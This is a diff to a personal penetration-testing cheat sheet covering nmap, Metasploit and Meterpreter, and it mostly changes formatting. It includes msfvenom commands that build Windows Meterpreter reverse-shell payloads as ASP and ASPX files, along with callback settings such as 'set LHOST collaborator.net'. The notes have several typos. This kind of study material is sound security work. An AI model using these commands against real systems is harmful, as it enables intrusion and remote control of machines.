@@ -44,11 +44,10 @@ nmap
         -A Enable OS detection, version detection, script scanning, and traceroute
 
 Metaslpoit
-
     MSFconsole
         Entry point for the framework
-        *$ msfconsole
-        > help*
+        *$ msfconsole*
+        *> help*
 
         against known vulnerabilities
         *> show exploits*
@@ -57,20 +56,17 @@ Metaslpoit
         *> search vsftp*
 
         Create a reverse shell, works for any format (php, asp, exe..):
-            *msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f asp > shell.asp*
+        *msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f asp > shell.asp*
 
         modules available (DoS tools, port scanning, fuzzers..)
         *> show auxiliary*
+        *> show payloads
+> show options
+> show targets
 
-        > show payloads
-
-        > show options
-        > show targets
-
-        > use payload/bla
-        > set RHOST 192..
-        > run
-
+> use payload/bla
+> set RHOST 192..
+> run*
         if you need the server to make a callback to you:
 
         set LHOST collaborator.net
@@ -89,15 +85,15 @@ Metaslpoit
 
     Meterpeter
         Create a meterpeter reverse shell (any language/format)
-            *$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f aspx > shell.aspx*
+        *$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f aspx > shell.aspx*
         Listen for a reverse shell:
-            *> set PAYLOAD windows/meterpreter/reverse_tcp*
+        *> set PAYLOAD windows/meterpreter/reverse_tcp*
         Put session in background:
-            *> backgound*
+        *> backgound*
         List sessions
-            *> sessions -l*
+        *> sessions -l*
         Switch to session
-            *> session -i 1*
+        *> session -i 1*
 
 Netcat
     Listens for incoming connections
